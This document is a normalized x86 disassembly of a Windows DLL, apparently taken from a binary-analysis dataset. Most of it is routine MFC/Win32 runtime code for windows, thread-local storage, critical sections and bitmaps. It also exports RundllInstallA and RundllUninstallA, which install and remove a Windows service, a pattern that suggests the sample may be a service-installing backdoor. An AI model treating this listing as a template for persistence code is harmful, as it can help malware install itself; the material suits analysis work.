mov eax ebx
and eax 0xf
cmp eax 0x1
jbe r-xdata
add eax 0x30000
mov [ esi ] eax
lea eax [ ebp - 0x114 ]
push 0x104
push eax
push 0x0
lea edi [ ebp - 0x114 ]
call [ GetModuleFileNameA@IAT ]
mov edi [ edi + 0x78 ]
jmp r-xdata
or ebx 0x30
cmp eax 0x2
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
push ebx
push edi
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ MessageBoxA@IAT ]
test esi esi
mov edi eax
je r-xdata
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x10 ]
push 0x1
call sub_10018bd1
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0xc
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
sub_10018ce6
push ebp
mov ebp esp
call sub_10019774
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
xor ecx ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018bff
push [ ebp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x8c ]
jmp r-xdata
pop ebp
retn 0xc
sub_10018d1e
mov eax sub_1001a51c
call sub_10008d90
push ecx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_1001554e
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
push esi
push eax
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
call sub_10018ce6
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_10014bf1
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov eax [ ebp + 0x8 ]
sub_10018d77
push ebx
mov ebx [ GetParent@IAT ]
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
test ebp ebp
mov esi ebp
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
call sub_10018e13
test eax eax
jne r-xdata
test esi esi
mov edi esi
mov eax esi
je r-xdata
push esi
call ebx
mov esi eax
jmp r-xdata
mov esi [ eax + 0x1c ]
call sub_10006cd6
test eax eax
jne r-xdata
test ebp ebp
jne r-xdata
push eax
mov edi eax
call ebx
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor esi esi
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
test edi edi
je r-xdata
push esi
call [ GetLastActivePopup@IAT ]
mov esi eax
and [ ebx ] 0x0
push edi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push 0x0
push edi
mov [ ebx ] edi
call [ EnableWindow@IAT ]
jmp r-xdata
sub_10018e1f
push ebp
mov ebp esp
sub esp 0x100
lea eax [ ebp - 0x100 ]
push 0x100
push eax
push [ ebp + 0xc ]
call sub_100155d2
test eax eax
je r-xdata
leave
retn 0x10
push [ ebp + 0x14 ]
lea eax [ ebp - 0x100 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_10018e59
sub_10018e59
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi esi
cmp [ esi ] bl
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx ebx
call sub_10014d8b
mov edi eax
mov cl [ edi ]
cmp cl 0x25
jne r-xdata
sub edi [ ebx ]
mov ecx ebx
push edi
call sub_10014dda
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov cl [ esi ]
cmp cl 0x25
jne r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x30
jl r-xdata
movzx eax cl
test [ eax + rw-data ] 0x4
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x30
jl r-xdata
inc edi
inc ebx
inc edi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
inc esi
jmp r-xdata
mov [ edi ] cl
inc edi
inc esi
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp [ esi ] 0x0
je r-xdata
cmp al 0x5a
jg r-xdata
movsx eax al
sub eax 0x31
cmp al 0x39
jle r-xdata
inc ebx
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
cmp al 0x39
jle r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + eax * 4 ]
test eax eax
je r-xdata
mov [ edi ] 0x3f
inc edi
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
push eax
call [ lstrlenA@IAT ]
add ebx eax
jmp r-xdata
movsx eax al
sub eax 0x38
jmp r-xdata
push eax
push edi
call [ lstrcpyA@IAT ]
push edi
call [ lstrlenA@IAT ]
add edi eax
jmp r-xdata
inc edi
inc edi
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc esi
inc esi
cmp eax [ ebp + 0x14 ]
jl r-xdata
sub_10018ffb
mov eax sub_1001a4ad
call sub_10008d90
push ecx
push 0x118
call sub_1001909e
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_1001949c
sub_10019035
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi esi
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov al [ esi ]
cmp al 0x5c
je r-xdata
push [ esp + 0x14 ]
push edi
push [ esp + 0x18 ]
call [ lstrcpynA@IAT ]
xor eax eax
push edi
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
push esi
call sub_1000900d
pop ecx
mov edi eax
cmp al 0x2f
je r-xdata
pop edi
pop esi
retn 0xc
cmp [ esi ] 0x0
je r-xdata
cmp al 0x3a
jne r-xdata
push esi
call sub_1000900d
pop ecx
mov esi eax
jmp r-xdata
sub_100190d0
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x18 ] 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
lea eax [ esi + 0x1c ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
call sub_10013f97
sub_10019112
push ecx
push ecx
push ebp
push esi
mov esi ecx
push edi
lea eax [ esi + 0x1c ]
push eax
mov [ esp + 0x14 ] eax
call [ EnterCriticalSection@IAT ]
mov ebp [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
cmp edi ebp
jge r-xdata
push 0x1
pop edi
cmp ebp edi
jle r-xdata
mov eax [ esi + 0x10 ]
test [ eax + edi * 8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
add ebp 0x20
test eax eax
push ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add eax 0x8
cmp edi [ esi + 0xc ]
jl r-xdata
push eax
call [ GlobalHandle@IAT ]
mov ebx eax
push ebx
call [ GlobalUnlock@IAT ]
mov eax ebp
push 0x2002
shl eax 0x3
push eax
push ebx
call [ GlobalReAlloc@IAT ]
mov eax ebp
shl eax 0x3
push eax
push 0x2002
call [ GlobalAlloc@IAT ]
jmp r-xdata
cmp edi ebp
jl r-xdata
inc edi
add eax 0x8
cmp edi ebp
jl r-xdata
mov eax [ esi + 0x10 ]
or [ eax + edi * 8 ] 0x1
push [ esp + 0x10 ]
lea eax [ eax + edi * 8 ]
lea eax [ edi + 0x1 ]
mov [ esi + 0x8 ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ecx
pop ecx
retn
lea eax [ edi + 0x1 ]
mov [ esi + 0xc ] eax
push [ esp + 0x10 ]
call ebx
mov ebx eax
mov eax [ esi + 0x4 ]
mov ecx eax
imul ecx ecx 0x1fffffff
add ecx ebp
lea eax [ ebx + eax * 8 ]
shl ecx 0x3
push ecx
push 0x0
push eax
call sub_10009030
add esp 0xc
mov [ esi + 0x10 ] ebx
mov [ esi + 0x4 ] ebp
pop ebx
push [ esi + 0x10 ]
call [ GlobalHandle@IAT ]
push eax
call ebx
push [ esp + 0x14 ]
call [ LeaveCriticalSection@IAT ]
call sub_10013f97
mov ebx [ GlobalLock@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
test [ eax ] 0x1
je r-xdata
sub_10019224
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
lea eax [ edi + 0x1c ]
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov esi [ edi + 0x14 ]
mov ebx [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax [ edi + 0x10 ]
push [ ebp - 0x4 ]
and [ eax + ebx * 8 ] 0xfffffffe
lea eax [ eax + ebx * 8 ]
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp ebx [ esi + 0x8 ]
jge r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + ebx * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10019281
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
push [ esi ]
call [ TlsGetValue@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x10
call sub_1001909e
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea ebx [ edi + 0x8 ]
cmp eax [ ebx ]
jl r-xdata
xor edi edi
mov [ eax ] r--data
mov edi eax
jmp r-xdata
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + edx * 4 ] ecx
pop ebx
leave
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0xc ]
push 0x2
shl ecx 0x2
push ecx
push eax
call [ LocalReAlloc@IAT ]
mov eax [ esi + 0xc ]
shl eax 0x2
push eax
push 0x0
call [ LocalAlloc@IAT ]
jmp r-xdata
and [ edi + 0x8 ] 0x0
and [ edi + 0xc ] 0x0
lea ebx [ edi + 0x8 ]
lea eax [ esi + 0x1c ]
push eax
mov [ ebp - 0x4 ] edi
call [ EnterCriticalSection@IAT ]
push edi
lea ecx [ esi + 0x14 ]
call sub_1001908b
lea eax [ esi + 0x1c ]
push eax
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
mov eax [ ebx ]
mov ecx eax
imul ecx ecx 0x3fffffff
add ecx [ esi + 0xc ]
shl ecx 0x2
push ecx
mov ecx [ edi + 0xc ]
push 0x0
lea eax [ ecx + eax * 4 ]
push eax
call sub_10009030
mov eax [ esi + 0xc ]
add esp 0xc
mov [ ebx ] eax
push edi
push [ esi ]
call [ TlsSetValue@IAT ]
call sub_10013f97
test eax eax
mov [ edi + 0xc ] eax
jne r-xdata
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
sub_10019387
push esi
push edi
mov edi ecx
cmp [ edi ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov esi [ edi ]
push [ eax ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
xor esi esi
cmp esi [ eax + 0x8 ]
jge r-xdata
call sub_10019112
mov [ edi ] eax
mov ecx rw-data
mov eax ecx
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
call [ esp + 0xc ]
mov ecx [ rw-data ]
mov esi eax
push esi
push [ edi ]
call sub_10019281
mov eax [ eax + 0xc ]
mov esi [ eax + esi * 4 ]
jmp r-xdata
xor ecx ecx
call sub_100190d0
mov ecx eax
jmp r-xdata
test esi esi
jne r-xdata
mov [ rw-data ] ecx
sub_100193fe
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push eax
call sub_10019224
sub_1001941c
mov eax sub_1001a528
call sub_10008d90
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] esp
cmp [ esi ] edi
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x10
call sub_10019854
mov [ ebp - 0x4 ] edi
cmp [ esi ] edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call sub_100198c4
call [ ebp + 0x8 ]
mov [ esi ] eax
sub_10019467
push 0x10
call sub_100198c4
xor edi edi
push edi
push edi
call sub_1000870c
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_100194ce
mov eax sub_1001a53c
call sub_10008d90
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0xcc ]
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xcc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x30 ]
mov edi [ UnhookWindowsHookEx@IAT ]
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax + 0x58 ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
push eax
call edi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call sub_10008d46
pop ecx
sub_10019578
mov eax ecx
xor edx edx
lea ecx [ eax + 0x103c ]
mov [ eax + 0x1c ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
or [ eax + 0x104c ] 0xffffffff
lea ecx [ eax + 0x1048 ]
mov [ ecx + 0x8 ] edx
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov cl [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x28 ] 0x1c
mov [ eax + 0x20 ] 0x14
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] cl
mov [ eax + 0x30 ] 0x1
mov [ eax + 0x1040 ] 0x18
retn 0x4
sub_100195f6
mov eax sub_1001a55e
call sub_10008d90
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x1044 ]
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
mov ecx [ esi + 0x106c ]
lea edi [ esi + 0x106c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x1070 ]
call sub_100193fe
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
lea edx [ esi + 0x1048 ]
push edx
call [ eax + 0xc ]
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_100196a5
mov eax sub_1001a570
call sub_10008d90
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax ]
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
call sub_1001401f
push eax
call sub_10014331
pop ecx
mov ecx [ esi + 0x38 ]
jmp r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
sub_100197c7
push esi
push 0x1074
call sub_1001909e
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push 0x1
mov ecx esi
call sub_10019578
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_1001980f
cmp [ rw-data ] 0x0
push esi
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
push 0x1
pop esi
mov [ rw-data ] esi
call [ GetVersion@IAT ]
cmp al 0x4
jae r-xdata
and [ rw-data ] 0x0
push rw-data
call [ InitializeCriticalSection@IAT ]
test eax 0x80000000
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
sub_10019854
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
call sub_1001980f
pop ebx
retn 0x4
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi * 4 + rw-data ] ebx
mov ebx [ EnterCriticalSection@IAT ]
lea esi [ edi * 4 + rw-data ]
jne r-xdata
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call ebx
pop edi
pop esi
push ebp
mov ebp rw-data
push ebp
call ebx
cmp [ esi ] 0x0
jne r-xdata
push ebp
call [ LeaveCriticalSection@IAT ]
pop ebp
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi ]
sub_1001991b
push ebp
mov ebp esp
sub esp 0x90
push ebx
push esi
push edi
call [ GetMenuCheckMarkDimensions@IAT ]
movsx ebx ax
shr eax 0x10
movsx ecx ax
cmp ebx 0x20
mov [ ebp - 0xc ] ecx
jle r-xdata
lea eax [ ebx - 0x4 ]
lea esi [ ebx + 0xf ]
cdq
sub eax edx
sar esi 0x4
mov edi eax
mov eax esi
sar edi 0x1
shl eax 0x4
add edi eax
sub edi ebx
cmp edi 0xc
jle r-xdata
push 0x20
pop ebx
push 0x20
pop eax
cmp ecx eax
jle r-xdata
push 0xc
pop edi
push 0x80
lea eax [ ebp - 0x90 ]
push 0xff
push eax
call sub_10009030
mov eax [ ebp - 0xc ]
add esp 0xc
add eax 0xfffffffa
mov [ ebp - 0x4 ] r--data
sar eax 0x1
imul eax esi
add esi esi
mov [ ebp - 0x8 ] 0x5
lea edx [ ebp + eax * 2 - 0x90 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx edi
movzx ax [ eax ]
shl eax cl
inc [ ebp - 0x4 ]
xor ecx ecx
not eax
mov cl ah
mov [ edx + 0x1 ] al
mov [ edx ] cl
add edx esi
dec [ ebp - 0x8 ]
jne r-xdata
lea eax [ ebp - 0x90 ]
push eax
push 0x1
push 0x1
push [ ebp - 0xc ]
push ebx
call [ CreateBitmap@IAT ]
pop edi
pop esi
test eax eax
mov [ rw-data ] eax
pop ebx
jne r-xdata
leave
retn
push 0x7fe3
push eax
call [ LoadBitmapA@IAT ]
mov [ rw-data ] eax
sub_100199fb
mov eax sub_1001a645
call sub_10008d90
push ecx
push 0x3c
call sub_10014308
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_10015b9b
sub_10019a33
mov eax sub_1001a65a
call sub_10008d90
push ecx
push esi
mov ecx rw-data
call sub_10006c1b
mov esi eax
mov [ ebp - 0x10 ] esi
xor eax eax
cmp esi eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov ecx esi
call sub_10015b9b
mov [ esi ] r--data
mov eax esi
sub_10019ade
mov eax sub_1001a66d
call sub_10008d90
push ecx
push 0x10
call sub_1001909e
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_10019cae
sub_10019b0f
mov eax sub_1001a680
call sub_10008d90
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push 0x0
call eax
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call [ FreeLibrary@IAT ]
sub_10019b92
jmp r-xdata
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10019bc1
cmp [ rw-data ] 0x0
je r-xdata
retn
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
inc eax
push 0x3
mov [ rw-data ] eax
call esi
inc eax
mov [ rw-data ] 0x1
mov [ rw-data ] eax
pop esi
sub_10019c13
push ebx
push esi
push edi
mov esi ecx
call [ GetVersion@IAT ]
xor ecx ecx
push 0x1
mov cl ah
movzx edx al
movzx ecx cl
shl edx 0x8
add ecx edx
mov [ esi + 0x54 ] ecx
mov ecx eax
shr ecx 0x1f
cmp al 0x4
mov [ esi + 0x58 ] ecx
sbb eax eax
pop ecx
inc eax
xor ebx ebx
sub ecx eax
cmp eax ebx
mov [ esi + 0x5c ] eax
mov [ esi + 0x60 ] ecx
mov [ esi + 0x64 ] eax
mov [ esi + 0x68 ] ebx
je r-xdata
mov ecx esi
call sub_100182bc
mov ecx esi
mov [ esi + 0x24 ] ebx
call sub_10018278
mov edi [ LoadCursorA@IAT ]
push 0x7f02
push ebx
call edi
push 0x7f00
push ebx
mov [ esi + 0x3c ] eax
call edi
mov [ esi + 0x40 ] eax
xor eax eax
cmp [ esi + 0x5c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x44 ] ebx
pop edi
setne al
inc eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebx
retn
push ebx
call [ GetProcessVersion@IAT ]
cmp eax 0x40000
sbb eax eax
inc eax
mov [ esi + 0x68 ] eax
sub_10019cf3
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push eax
call [ GetOEMCP@IAT ]
push eax
call [ GetCPInfo@IAT ]
push 0x1
pop eax
cmp eax [ ebp - 0x14 ]
sbb eax eax
neg eax
leave
retn
sub_10019e9e
push esi
mov ecx rw-data
call sub_10006c1b
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov ecx esi
call sub_10018661
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_10019fe4
mov eax sub_1001a6e0
call sub_10008d90
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x4
push ecx
call sub_100185c0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_10001000
mov eax ecx
mov [ eax ] r--data
retn
sub_10001010
push esi
mov esi ecx
call sub_10001030
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
add esp 0x4
sub_10001030
mov [ ecx ] r--data
retn
sub_10001df0
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax ] 0x0
retn 0x4
sub_10001f30
mov eax 0xfffffffd
retn
sub_10001f99
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
add eax 0x2
test eax eax
jge r-xdata
push eax
call sub_10014308
mov [ ebp + 0x8 ] eax
add esp 0x4
mov eax r-xdata
retn
xor eax eax
sub_10002120
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_10002140
or cl al
mov [ rw-data ] cl
sub_10002140
push sub_10002150
call sub_10007b53
pop ecx
retn
sub_10002150
retn
sub_100022e0
push esi
mov esi ecx
call sub_10002300
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
add esp 0x4
sub_100036d0
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax * 2 ] 0x0
retn 0x4
sub_10003820
mov eax 0x7ffffffd
retn
sub_10003a20
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_10003a40
or cl al
mov [ rw-data ] cl
sub_10003a40
push sub_10002150
call sub_10007b53
pop ecx
retn
sub_10003c70
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_10003c90
or cl al
mov [ rw-data ] cl
sub_10003c90
push sub_10002150
call sub_10007b53
pop ecx
retn
sub_10003d00
push esi
mov esi ecx
call sub_10003d20
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
add esp 0x4
sub_10003d20
mov [ ecx ] r--data
jmp sub_10002300
sub_100050f0
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_10005110
or cl al
mov [ rw-data ] cl
sub_10005110
push sub_10002150
call sub_10007b53
pop ecx
retn
sub_10005170
push esi
mov esi ecx
call sub_10005190
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
add esp 0x4
sub_10005420
mov eax [ esp + 0x4 ]
push ecx
push 0x0
push sub_10005440
mov [ ecx + 0x7c ] eax
call sub_10007d6f
add esp 0xc
retn 0x4
sub_100056e0
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_10005700
or cl al
mov [ rw-data ] cl
sub_10005700
push sub_10002150
call sub_10007b53
pop ecx
retn
sub_10005710
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
mov eax 0x1
retn 0xc
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
RundllInstallA
mov eax [ esp + 0xc ]
push eax
call InstallService
pop ecx
retn 0x10
sub_10005e1c
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx ]
mov [ ebp - 0x2c ] edx
mov eax 0x1
retn
RundllUninstallA
mov eax [ esp + 0xc ]
push eax
call UninstallService
pop ecx
retn 0x10
sub_10005f90
call sub_10003a50
mov eax 0x1
retn 0x4
sub_10006000
push esi
mov esi ecx
call sub_10006020
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
add esp 0x4
sub_10006020
mov [ ecx ] r--data
jmp sub_10002300
sub_10006540
mov cl [ rw-data ]
mov al 0x1
test al cl
jne r-xdata
jmp sub_10006560
or cl al
mov [ rw-data ] cl
sub_10006560
push sub_10002150
call sub_10007b53
pop ecx
retn
sub_10006570
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x18 ] 0x5c
retn
sub_10006591
push esi
mov esi ecx
call sub_100065ad
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
pop ecx
sub_10006629
push [ ecx + 0xc ]
call [ FindClose@IAT ]
retn
sub_10006713
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
and eax [ esp + 0x4 ]
neg eax
sbb eax eax
neg eax
jmp r-xdata
retn 0x4
sub_10006907
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
add ecx 0x14
push ecx
mov ecx [ ebp + 0x8 ]
call sub_10014966
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10006aaa
